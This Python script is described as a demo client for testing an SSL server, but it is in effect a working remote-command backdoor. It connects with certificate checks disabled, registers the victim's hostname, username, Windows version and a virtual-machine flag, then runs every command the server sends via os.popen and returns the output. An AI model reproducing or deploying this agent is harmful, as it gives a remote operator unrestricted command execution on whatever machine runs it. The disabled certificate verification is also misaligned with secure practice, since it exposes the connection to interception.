## demo client used for testing the ssl mt server

import socket
import ssl

import json
import os

HOST = 'localhost'  # The server's hostname or IP address
PORT = 443          # The port used by the server

CERTCHAIN_PATH = "./cert/certchain.pem"

# create ssl context and disable ssl verification
context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    # connect and wrap with ssl
    sock.connect((HOST, PORT))
    secure_sock = context.wrap_socket(sock)

    # send initiative data
    agentData: dict = dict()
    agentData["hostname"] = "DESKTOP-4TUROIG"
    agentData["username"] = "ORGUR"
    agentData["winVersion"] = "10.2 (6.22)"
    agentData["isVM"] = False

    # send 'register' request
    agentDataStr: str = json.dumps(agentData)
    secure_sock.sendall(agentDataStr.encode())

    # from now on agent will get cmd commands
    while True:
        data = secure_sock.recv(1024).decode()
        print(f"CMD command is: {data}")
        output: str = os.popen(data).read()
        secure_sock.sendall(output.encode())